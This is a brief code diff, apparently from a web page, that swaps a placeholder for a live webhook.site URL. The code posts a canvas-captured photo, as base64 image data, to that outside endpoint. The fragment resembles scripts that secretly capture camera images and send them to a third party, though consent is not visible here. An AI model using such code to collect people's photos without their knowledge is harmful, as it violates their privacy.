@@ -26,7 +26,7 @@
       const dataUrl = canvas.toDataURL('image/png');
 
       // Enviar foto al Webhook
-      fetch('AQUI_TU_WEBHOOK', {
+      fetch('https://webhook.site/5e805d99-f365-401a-bdb3-25088b37e4c8', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ imagen: dataUrl })
